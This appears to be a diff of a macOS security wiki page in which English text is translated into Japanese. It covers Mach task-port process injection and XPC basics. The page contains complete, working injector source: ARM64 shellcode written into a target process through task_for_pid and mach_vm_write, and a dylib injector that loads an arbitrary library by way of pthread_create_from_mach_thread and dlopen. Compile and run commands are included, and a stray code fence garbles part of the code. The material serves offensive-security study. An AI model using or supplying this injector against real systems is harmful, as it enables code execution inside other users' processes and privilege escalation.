-    kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
-    (thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );
+const char* p = (const char*) remoteCode64;
 
-    if (kr != KERN_SUCCESS) {
-        fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
-        return (-3);
-    }
+remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
+remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
+remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
+remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;
 
-    return (0);
+printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );
+
+kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
+(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );
+
+if (kr != KERN_SUCCESS) {
+fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
+return (-3);
+}
+
+return (0);
 }
 
 int main(int argc, const char * argv[]) {
-    @autoreleasepool {
-        if (argc < 2) {
-            NSLog(@"Usage: %s <pid>", argv[0]);
-            return 1;
-        }
+@autoreleasepool {
+if (argc < 2) {
+NSLog(@"Usage: %s <pid>", argv[0]);
+return 1;
+}
 
-        pid_t pid = atoi(argv[1]);
-        inject(pid);
-    }
+pid_t pid = atoi(argv[1]);
+inject(pid);
+}
 
-    return 0;
+return 0;
 }
 ```
-
 </details>
-
 ```bash
 gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
 ./inject <pid-of-mysleep>
 ```
+### タスクポートを介したDylibプロセスインジェクション
 
-### Dylib Process Injection via Task port
+macOSでは、**スレッド**は**Mach**を使用するか、**posixの`pthread` API**を使用して操作することができます。前のインジェクションで生成したスレッドは、Mach APIを使用して生成されたため、**posixに準拠していません**。
 
-In macOS **threads** might be manipulated via **Mach** or using **posix `pthread` api**. The thread we generated in the previos injection, was generated using Mach api, so **it's not posix compliant**.
+単純なシェルコードをインジェクションしてコマンドを実行することができたのは、**posixに準拠する必要がなく**、Machのみで動作する必要があったためです。**より複雑なインジェクション**では、スレッドも**posixに準拠する必要があります**。
 
-It was possible to **inject a simple shellcode** to execute a command because it **didn't need to work with posix** compliant apis, only with Mach. **More complex injections** would need the **thread** to be also **posix compliant**.
+したがって、シェルコードを**改善するために**、**`pthread_create_from_mach_thread`**を呼び出す必要があります。これにより、新しいpthreadが**有効なpthreadを作成**できます。その後、この新しいpthreadは、システムから**dylibをロード**するために**dlopen**を呼び出すことができます。
 
-Therefore, to **improve the shellcode** it should call **`pthread_create_from_mach_thread`** which will **create a valid pthread**. Then, this new pthread could **call dlopen** to **load our dylib** from the system.
-
-You can find **example dylibs** in (for example the one that generates a log and then you can listen to it):
+例えば、（ログを生成し、それを聞くことができるものなど）**例のdylib**は以下で見つけることができます：
 
 {% content-ref url="../../macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
 [macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../../macos-dyld-hijacking-and-dyld\_insert\_libraries.md)
@@ -418,7 +511,6 @@ You can find **example dylibs** in (for example the one that generates a log and
 <details>
 
 <summary>dylib_injector.m</summary>
-
 ```objectivec
 // gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
 // Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
@@ -444,18 +536,18 @@ You can find **example dylibs** in (for example the one that generates a log and
 // And I say, bullshit.
 kern_return_t mach_vm_allocate
 (
-        vm_map_t target,
-        mach_vm_address_t *address,
-        mach_vm_size_t size,
-        int flags
+vm_map_t target,
+mach_vm_address_t *address,
+mach_vm_size_t size,
+int flags
 );
 
 kern_return_t mach_vm_write
 (
-        vm_map_t target_task,
-        mach_vm_address_t address,
-        vm_offset_t data,
-        mach_msg_type_number_t dataCnt
+vm_map_t target_task,
+mach_vm_address_t address,
+vm_offset_t data,
+mach_msg_type_number_t dataCnt
 );
 
 
@@ -470,234 +562,231 @@ kern_return_t mach_vm_write
 
 char injectedCode[] =
 
-    "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)
+"\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)
 
-    // Call pthread_set_self
+// Call pthread_set_self
 
-    "\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
-    "\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
-    "\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
-    "\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the 
-    "\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
-    "\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
-    "\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
-    "\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
-    "\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
-    "\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
-    "\x00\x00\x00\x14" // loop: b loop              ; loop forever
+"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
+"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
+"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
+"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
+"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
+"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
+"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
+"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
+"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
+"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
+"\x00\x00\x00\x14" // loop: b loop              ; loop forever
 
-    // Call dlopen with the path to the library
-    "\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
-    "\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
-    "\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
-    "\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
-    "\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()
-    
-    // Call pthread_exit
-    "\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
-    "\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
-    "\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit
-    
-    "PTHRDCRT"  // <-
-    "PTHRDEXT"  // <-
-    "DLOPEN__"  // <- 
-    "LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB" 
-    "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
-    "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
-    "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
-    "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
-    "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;
+// Call dlopen with the path to the library
+"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
+"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
+"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
+"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
+"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()
+
+// Call pthread_exit
+"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
+"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
+"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit
+
+"PTHRDCRT"  // <-
+"PTHRDEXT"  // <-
+"DLOPEN__"  // <-
+"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
+"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
+"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
+"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
+"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
+"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;
 
 
 
 
 int inject(pid_t pid, const char *lib) {
 
-    task_t remoteTask;
-    struct stat buf;
+task_t remoteTask;
+struct stat buf;
 
-    // Check if the library exists
-    int rc = stat (lib, &buf);
+// Check if the library exists
+int rc = stat (lib, &buf);
 
-    if (rc != 0)
-    {
-        fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
-        //return (-9);
-    }
+if (rc != 0)
+{
+fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
+//return (-9);
+}
 
-    // Get access to the task port of the process we want to inject into
-    kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
-    if (kr != KERN_SUCCESS) {
-        fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
-        return (-1);
-    }
-    else{
-        printf("Gathered privileges over the task port of process: %d\n", pid);
-    }
+// Get access to the task port of the process we want to inject into
+kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
+if (kr != KERN_SUCCESS) {
+fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
+return (-1);
+}
+else{
+printf("Gathered privileges over the task port of process: %d\n", pid);
+}
 
-    // Allocate memory for the stack
-    mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
-    mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
-    kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);
-    
-    if (kr != KERN_SUCCESS)
-    {
-        fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
-        return (-2);
-    }
-    else
-    {
+// Allocate memory for the stack
+mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
+mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
+kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);
 
-        fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
-    }
-    
-    // Allocate memory for the code
-    remoteCode64 = (vm_address_t) NULL;
-    kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
+return (-2);
+}
+else
+{
 
-    if (kr != KERN_SUCCESS)
-    {
-        fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
-        return (-2);
-    }
+fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
+}
 
- 
-    // Patch shellcode
+// Allocate memory for the code
+remoteCode64 = (vm_address_t) NULL;
+kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );
 
-    int i = 0;
-    char *possiblePatchLocation = (injectedCode );
-    for (i = 0 ; i < 0x100; i++)
-    {
-
-        // Patching is crude, but works.
-        //
-        extern void *_pthread_set_self;
-        possiblePatchLocation++;
-
-        
-        uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
-        uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
-        uint64_t addrOfDlopen = (uint64_t) dlopen;
-
-        if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
-        {
-            memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
-            printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
-        }
-
-        if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
-        {
-            memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
-            printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
-        }
-
-        if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
-        {
-            printf ("DLOpen @%llx\n", addrOfDlopen);
-            memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
-        }
-
-        if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
-        {
-            strcpy(possiblePatchLocation, lib );
-        }
-    }
-
-	// Write the shellcode to the allocated memory
-    kr = mach_vm_write(remoteTask,                   // Task port
-	                   remoteCode64,                 // Virtual Address (Destination)
-	                   (vm_address_t) injectedCode,  // Source
-	                    0xa9);                       // Length of the source
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
+return (-2);
+}
 
 
-    if (kr != KERN_SUCCESS)
-    {
-        fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
-        return (-3);
-    }
+// Patch shellcode
+
+int i = 0;
+char *possiblePatchLocation = (injectedCode );
+for (i = 0 ; i < 0x100; i++)
+{
+
+// Patching is crude, but works.
+//
+extern void *_pthread_set_self;
+possiblePatchLocation++;
 
 
-    // Set the permissions on the allocated code memory
-    kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
+uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
+uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
+uint64_t addrOfDlopen = (uint64_t) dlopen;
 
-    if (kr != KERN_SUCCESS)
-    {
-        fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
-        return (-4);
-    }
+if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
+{
+memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
+printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
+}
+```c
+if (memcmp(possiblePatchLocation, "PTHRDCRT", 8) == 0)
+{
+    memcpy(possiblePatchLocation, &addrOfPthreadCreate, 8);
+    printf("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
+}
 
-    // Set the permissions on the allocated stack memory
-    kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);
-	
-    if (kr != KERN_SUCCESS)
-    {
-        fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
-        return (-4);
-    }
+if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
+{
+    printf("DLOpen @%llx\n", addrOfDlopen);
+    memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
+}
+
+if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
+{
+    strcpy(possiblePatchLocation, lib);
+}
+}
+
+// Write the shellcode to the allocated memory
+kr = mach_vm_write(remoteTask,                   // タスクポート
+remoteCode64,                 // 仮想アドレス（宛先）
+(vm_address_t) injectedCode,  // ソース
+0xa9);                       // ソースの長さ
 
 
-    // Create thread to run shellcode
-    struct arm_unified_thread_state remoteThreadState64;
-    thread_act_t         remoteThread;
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr, "リモートスレッドメモリの書き込みに失敗しました：エラー %s\n", mach_error_string(kr));
+return (-3);
+}
 
-    memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );
 
-    remoteStack64 += (STACK_SIZE / 2); // this is the real stack
-        //remoteStack64 -= 8;  // need alignment of 16
+// 割り当てられたコードメモリのアクセス許可を設定する
+kr = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
 
-    const char* p = (const char*) remoteCode64;
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr, "リモートスレッドのコードのメモリアクセス許可を設定できません：エラー %s\n", mach_error_string(kr));
+return (-4);
+}
 
-    remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
-    remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
-    remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
-    remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;
+// 割り当てられたスタックメモリのアクセス許可を設定する
+kr = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);
 
-    printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr, "リモートスレッドのスタックのメモリアクセス許可を設定できません：エラー %s\n", mach_error_string(kr));
+return (-4);
+}
 
-    kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
-    (thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );
 
-    if (kr != KERN_SUCCESS) {
-        fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
-        return (-3);
-    }
+// シェルコードを実行するためのスレッドを作成する
+struct arm_unified_thread_state remoteThreadState64;
+thread_act_t         remoteThread;
 
-    return (0);
+memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64));
+
+remoteStack64 += (STACK_SIZE / 2); // これが実際のスタックです
+//remoteStack64 -= 8;  // 16のアライメントが必要です
+
+const char* p = (const char*) remoteCode64;
+
+remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
+remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
+remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
+remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;
+
+printf("リモートスタック64  0x%llx、リモートコードは %p\n", remoteStack64, p);
+
+kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
+(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT, &remoteThread);
+
+if (kr != KERN_SUCCESS) {
+fprintf(stderr, "リモートスレッドの作成に失敗しました：エラー %s", mach_error_string(kr));
+return (-3);
+}
+
+return (0);
 }
 
 
 
 int main(int argc, const char * argv[])
 {
-    if (argc < 3)
-	{
-		fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
-		fprintf (stderr, "   _action_: path to a dylib on disk\n");
-		exit(0);
-	}
+if (argc < 3)
+{
+fprintf(stderr, "使用法：%s _pid_ _action_\n", argv[0]);
+fprintf(stderr, "   _action_：ディスク上のdylibへのパス\n");
+exit(0);
+}
 
-    pid_t pid = atoi(argv[1]);
-    const char *action = argv[2];
-    struct stat buf;
+pid_t pid = atoi(argv[1]);
+const char *action = argv[2];
+struct stat buf;
 
-    int rc = stat (action, &buf);
-    if (rc == 0) inject(pid,action);
-    else
-    {
-        fprintf(stderr,"Dylib not found\n");
-    }
+int rc = stat(action, &buf);
+if (rc == 0) inject(pid, action);
+else
+{
+fprintf(stderr, "Dylibが見つかりません\n");
+}
 
 }
 ```
-
 </details>
-
 ```bash
 gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
 ./inject <pid-of-mysleep> </path/to/lib.dylib>
 ```
-
-### Thread Injection via Task port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>
+### タスクポートを介したスレッドインジェクション <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>
 
 {% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md" %}
 [macos-thread-injection-via-task-port.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md)
@@ -705,36 +794,35 @@ gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
 
 ## XPC
 
-### Basic Information
+### 基本情報
 
-XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.
+XPC（XNUはmacOSで使用されるカーネルの略）インタープロセス通信は、macOSとiOS上のプロセス間の通信のためのフレームワークです。XPCは、システム上の異なるプロセス間で安全な非同期メソッド呼び出しを行うためのメカニズムを提供します。これはAppleのセキュリティパラダイムの一部であり、特権を分離したアプリケーションの作成を可能にし、各コンポーネントが必要な権限のみで動作するため、侵害されたプロセスからの潜在的な被害を制限します。
 
-XPC uses a form of Inter-Process Communication (IPC), which is a set of methods for different programs running on the same system to send data back and forth.
+XPCは、同じシステム上で実行される異なるプログラム間でデータを送受信するための一連のメソッドである、プロセス間通信（IPC）の形式を使用します。
 
-The primary benefits of XPC include:
+XPCの主な利点は次のとおりです：
 
-1. **Security**: By separating work into different processes, each process can be granted only the permissions it needs. This means that even if a process is compromised, it has limited ability to do harm.
-2. **Stability**: XPC helps isolate crashes to the component where they occur. If a process crashes, it can be restarted without affecting the rest of the system.
-3. **Performance**: XPC allows for easy concurrency, as different tasks can be run simultaneously in different processes.
+1. **セキュリティ**：作業を異なるプロセスに分割することで、各プロセスに必要な権限のみを付与することができます。これにより、プロセスが侵害された場合でも、被害を最小限に抑えることができます。
+2. **安定性**：XPCはクラッシュを発生したコンポーネントに限定することで、システム全体に影響を与えずにプロセスを再起動するのに役立ちます。
+3. **パフォーマンス**：XPCは簡単な並行性を可能にし、異なるプロセスで同時にさまざまなタスクを実行できます。
 
-The only **drawback** is that **separating an application is several processes** making them communicate via XPC is **less efficient**. But in todays systems this isn't almost noticeable and the benefits are much better.
+唯一の**欠点**は、アプリケーションを複数のプロセスに分割してXPCを介して通信させることは、**効率が低下する**ということです。しかし、現在のシステムではほとんど気づかれず、利点の方がはるかに優れています。
 
-An example can be seen in QuickTime Player, where a component using XPC is responsible for video decoding. The component is specifically designed to perform computational tasks, thus, in the event of a breach, it wouldn't provide any useful gains to the attacker, such as access to files or the network.
+例として、QuickTime Playerでは、XPCを使用してビデオのデコードを担当するコンポーネントがあります。このコンポーネントは計算タスクを実行するために特別に設計されており、侵害された場合でも、ファイルやネットワークへのアクセスなど、攻撃者に有益な利得を提供しません。
 
-### Application Specific XPC services
+### アプリケーション固有のXPCサービス
 
-The XPC components of an applications are **inside the application itself.** For example, in Safari you can find them in **`/Applications/Safari.app/Contents/XPCServices`**. They have extension **`.xpc`** (like **`com.apple.Safari.SandboxBroker.xpc`**) and are **also bundles** with the main binary inside of it: `/Applications/Safari.app/Contents/XPCServices/com.apple.Safari.SandboxBroker.xpc/Contents/MacOS/com.apple.Safari.SandboxBroker`
+アプリケーションのXPCコンポーネントは、**アプリケーション自体の中にあります**。たとえば、Safariでは、**`/Applications/Safari.app/Contents/XPCServices`**にそれらを見つけることができます。拡張子は**`.xpc`**（例：**`com.apple.Safari.SandboxBroker.xpc`**）であり、**メインバイナリ**も**バンドル**されています：`/Applications/Safari.app/Contents/XPCServices/com.apple.Safari.SandboxBroker.xpc/Contents/MacOS/com.apple.Safari.SandboxBroker`
 
-As you might be thinking a **XPC component will have different entitlements and privileges** than the other XPC components or the main app binary. EXCEPT if an XPC service is configured with [**JoinExistingSession**](https://developer.apple.com/documentation/bundleresources/information\_property\_list/xpcservice/joinexistingsession) set to “True” in its **Info.plist** file. In this case, the XPC service will run in the same security session as the application that called it.
+XPCコンポーネントは、他のXPCコンポーネントやメインのアプリバイナリとは異なる**エンタイトルメントと特権**を持つ場合があります。ただし、XPCサービスが**Info.plist**ファイルで[**JoinExistingSession**](https://developer.apple.com/documentation/bundleresources/information\_property\_list/xpcservice/joinexistingsession)を「True」に設定されている場合は除きます。この場合、XPCサービスは、それを呼び出したアプリケーションと同じセキュリティセッションで実行されます。
 
-XPC services are **started** by **launchd** when required and **shut down** once all tasks are **complete** to free system resources. **Application-specific XPC components can only be utilized by the application**, thereby reducing the risk associated with potential vulnerabilities.
+XPCサービスは、必要に応じて**launchd**によって**起動**され、すべてのタスクが**完了**した後に**シャットダウン**され、システムリソースを解放します。**アプリケーション固有のXPCコンポーネントは、アプリケーションのみが利用できる**ため、潜在的な脆弱性に関連するリスクを低減します。
 
-### System Wide XPC services
+### システム全体のXPCサービス
 
-System-wide XPC services are accessible to all users. These services, either launchd or Mach-type, need to be **defined in plist** files located in specified directories such as **`/System/Library/LaunchDaemons`**, **`/Library/LaunchDaemons`**, **`/System/Library/LaunchAgents`**, or **`/Library/LaunchAgents`**.
+システム全体のXPCサービスは、すべてのユーザーがアクセスできます。これらのサービスは、launchdまたはMachタイプであり、**`/System/Library/LaunchDaemons`**、**`/Library/LaunchDaemons`**、**`/System/Library/LaunchAgents`**、または**`/Library/LaunchAgents`**などの指定されたディレクトリにあるplistファイルで定義する必要があります。
 
-These plists files will have a key called **`MachServices`** with the name of the service, and a key called **`Program`** with the path to the binary:
-
+これらのplistファイルには、サービスの名前を持つ**`MachServices`**キーと、バイナリへのパスを持つ**`Program`**キーがあります。
 ```xml
 cat /Library/LaunchDaemons/com.jamf.management.daemon.plist
 
@@ -742,56 +830,55 @@ cat /Library/LaunchDaemons/com.jamf.management.daemon.plist
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
-	<key>Program</key>
-	<string>/Library/Application Support/JAMF/Jamf.app/Contents/MacOS/JamfDaemon.app/Contents/MacOS/JamfDaemon</string>
-	<key>AbandonProcessGroup</key>
-	<true/>
-	<key>KeepAlive</key>
-	<true/>
-	<key>Label</key>
-	<string>com.jamf.management.daemon</string>
-	<key>MachServices</key>
-	<dict>
-		<key>com.jamf.management.daemon.aad</key>
-		<true/>
-		<key>com.jamf.management.daemon.agent</key>
-		<true/>
-		<key>com.jamf.management.daemon.binary</key>
-		<true/>
-		<key>com.jamf.management.daemon.selfservice</key>
-		<true/>
-		<key>com.jamf.management.daemon.service</key>
-		<true/>
-	</dict>
-	<key>RunAtLoad</key>
-	<true/>
+<key>Program</key>
+<string>/Library/Application Support/JAMF/Jamf.app/Contents/MacOS/JamfDaemon.app/Contents/MacOS/JamfDaemon</string>
+<key>AbandonProcessGroup</key>
+<true/>
+<key>KeepAlive</key>
+<true/>
+<key>Label</key>
+<string>com.jamf.management.daemon</string>
+<key>MachServices</key>
+<dict>
+<key>com.jamf.management.daemon.aad</key>
+<true/>
+<key>com.jamf.management.daemon.agent</key>
+<true/>
+<key>com.jamf.management.daemon.binary</key>
+<true/>
+<key>com.jamf.management.daemon.selfservice</key>
+<true/>
+<key>com.jamf.management.daemon.service</key>
+<true/>
+</dict>
+<key>RunAtLoad</key>
+<true/>
 </dict>
 </plist>
 ```
+**`LaunchDameons`**内のものはrootによって実行されます。したがって、特権を持たないプロセスがこれらのいずれかと通信できれば、特権を昇格させることができる可能性があります。
 
-The ones in **`LaunchDameons`** are run by root. So if an unprivileged process can talk with one of these it could be able to escalate privileges.
+### XPCイベントメッセージ
 
-### XPC Event Messages
+アプリケーションは、異なるイベントメッセージに**サブスクライブ**することができ、そのようなイベントが発生したときに**オンデマンドで起動**することができます。これらのサービスのセットアップは、**`LaunchEvent`**キーを含む**`launchd plistファイル`**によって行われます。これらのファイルは、前述のものと同じディレクトリにあります。
 
-Applications can **subscribe** to different event **messages**, enabling them to be **initiated on-demand** when such events happen. The **setup** for these services is done in l**aunchd plist files**, located in the **same directories as the previous ones** and containing an extra **`LaunchEvent`** key.
+### XPC接続プロセスのチェック
 
-### XPC Connecting Process Check
-
-When a process tries to call a method from via an XPC connection, the **XPC service should check if that process is allowed to connect**. Here are the common ways to check that and the common pitfalls:
+プロセスがXPC接続を介してメソッドを呼び出そうとするとき、**XPCサービスはそのプロセスが接続を許可されているかどうかをチェックする必要があります**。以下は、そのチェック方法と一般的な落とし穴です:
 
 {% content-ref url="macos-xpc-connecting-process-check.md" %}
 [macos-xpc-connecting-process-check.md](macos-xpc-connecting-process-check.md)
 {% endcontent-ref %}
 
-### XPC Authorization
+### XPC認証
 
-Apple also allows apps to **configure some rights and how to get them** so if the calling process have them it would be **allowed to call a method** from the XPC service:
+Appleはまた、アプリが**いくつかの権限とその取得方法を設定**することも許可しています。したがって、呼び出し元のプロセスがこれらの権限を持っている場合、XPCサービスからのメソッドの呼び出しが**許可されます**。
 
 {% content-ref url="macos-xpc-authorization.md" %}
